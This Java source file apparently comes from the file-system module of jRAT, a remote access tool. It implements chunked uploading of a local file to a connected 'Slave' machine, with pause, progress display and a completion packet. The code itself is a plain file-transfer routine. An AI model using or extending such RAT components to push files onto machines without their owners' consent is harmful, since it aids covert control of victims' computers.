package jrat.module.fs;

import jrat.common.Transfer;
import jrat.common.TransferRunnable;
import jrat.common.io.TransferData;
import jrat.controller.Slave;
import jrat.module.fs.packets.upload.Packet102UploadState;
import jrat.module.fs.packets.upload.Packet104Part;
import jrat.module.fs.ui.PanelFileTransfers;

import java.io.File;
import java.io.FileInputStream;

public class ThreadUploadFile extends TransferRunnable {
	
	private Slave slave;
	
	public ThreadUploadFile(Slave slave, String remoteFile, File file) {
		this.slave = slave;
		
		data = new TransferData();
		PanelFileTransfers.instance.add(data);
		data.setRemoteFile(remoteFile);
		data.setLocalFile(file);
		data.setTotal(file.length());
		data.setObject(slave);
		
		data.setRunnable(this);
	}
	
	public ThreadUploadFile(TransferData data) {
		super(data);
	}
	
	@Override
	public void run() {
		try {	
			File file = data.getLocalFile();
			String remoteFile = data.getRemoteFile();
			
			FileInputStream fileInput = new FileInputStream(file);
			byte[] chunk = new byte[1024 * 8];

			for (long pos = 0; pos < file.length(); pos += 1024 * 8) {
				if (pause) {
					try {
						Thread.sleep(Long.MAX_VALUE);
					} catch (InterruptedException e) {

					}
				}
				
				if (Thread.interrupted() || !slave.isConnected()) {
					fileInput.close();
					return;
				}

				int read = fileInput.read(chunk);
				
				slave.addToSendQueue(new Packet104Part(remoteFile, chunk, read));
											
				data.increaseRead(read);
				PanelFileTransfers.instance.update();
			}
			
			fileInput.close();
			
			data.setState(TransferData.State.COMPLETED);
			onComplete();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public void onComplete() {
		slave.addToSendQueue(new Packet102UploadState(Transfer.Complete, data.getRemoteFile()));
	}

	public void setSlave(Slave slave) {
		this.slave = slave;
	}

}
